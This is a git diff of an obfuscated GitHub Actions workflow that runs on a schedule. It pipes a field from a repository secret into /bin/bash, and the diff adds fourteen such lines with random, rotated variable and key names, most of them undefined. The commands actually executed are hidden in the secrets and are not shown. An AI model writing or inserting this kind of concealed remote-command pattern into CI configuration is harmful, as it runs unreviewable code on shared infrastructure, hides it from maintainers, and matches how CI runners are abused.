@@ -2,18 +2,29 @@ name: zhaoshouyy
 on:
   workflow_dispatch:
   schedule:
-    - cron: '58 4/6 * * *'
-
+    - cron: '0 3/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: zhaoshouyy
         env:
-          rl8: ${{ secrets.rl8 }}
+          inau35: ${{ secrets.inau35 }}
         run: |
-          echo $rl8 | jq -r .fag959 | /bin/bash
-          echo $zi5 | jq -r .t02 | /bin/bash
-          echo $bdl76 | jq -r .vc37 | /bin/bash
+          echo $inau35 | jq -r .xzumq0775 | /bin/bash
+          echo $sbeax797 | jq -r .rd4239 | /bin/bash
+          echo $p9 | jq -r .lz35 | /bin/bash
+          echo $olwi42078 | jq -r .ulzz6 | /bin/bash
+          echo $bbsv3 | jq -r .y25529 | /bin/bash
+          echo $wllf68 | jq -r .lz560 | /bin/bash
+          echo $uq13039 | jq -r .tm12 | /bin/bash
+          echo $ffgy9 | jq -r .ekm4502 | /bin/bash
+          echo $odb7786 | jq -r .tda3 | /bin/bash
+          echo $cy6728 | jq -r .qnch00 | /bin/bash
+          echo $hopb235 | jq -r .tqfz019 | /bin/bash
+          echo $nzs97471 | jq -r .cqamp68 | /bin/bash
+          echo $kdrz301 | jq -r .eiyhc1 | /bin/bash
+          echo $he3 | jq -r .ouzp134 | /bin/bash
 
